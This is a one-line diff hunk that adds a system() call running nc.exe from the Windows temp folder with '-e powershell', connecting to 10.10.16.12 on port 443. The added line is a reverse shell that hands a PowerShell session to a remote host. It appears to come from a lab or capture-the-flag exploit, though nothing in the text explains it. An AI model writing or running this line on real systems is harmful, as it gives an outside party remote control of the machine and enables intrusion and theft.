@@ -1,0 +1,1 @@
+system("c:\windows\\temp\\nc.exe 10.10.16.12 443 -e powershell");
